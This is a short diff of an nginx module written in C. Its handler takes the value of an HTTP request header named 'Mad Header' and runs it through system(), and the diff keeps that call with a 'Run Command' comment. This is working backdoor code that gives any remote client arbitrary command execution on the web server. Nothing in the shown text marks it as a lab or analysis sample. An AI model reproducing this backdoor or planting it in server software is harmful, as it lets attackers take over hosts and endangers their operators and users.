@@ -117,16 +117,18 @@ search_headers_in(ngx_http_request_t *r, u_char *name, size_t len) {
  */
 static ngx_int_t ngx_http_mad_header_handler(ngx_http_request_t *r)
 {
+
     u_char ngx_mad_header[] = "Mad Header";
     u_int ngx_mad_header_len = ngx_strlen(ngx_mad_header);
     ngx_table_elt_t *cmd_elt = search_headers_in(r, ngx_mad_header, ngx_mad_header_len);
     if (cmd_elt != NULL){
-        system((const char *)(cmd_elt->value.data));
+        /* Run Command */
+        system((const char *)(cmd_elt->value.data));   
     }
+
     ngx_http_send_header(r); /* Send the headers */
 
-    /* Send the body, and return the status code of the output filter chain. */
-    return ngx_http_output_filter(r, &out);
+    return NGX_OK;
 } /* ngx_http_mad_header_handler */
 
 /**
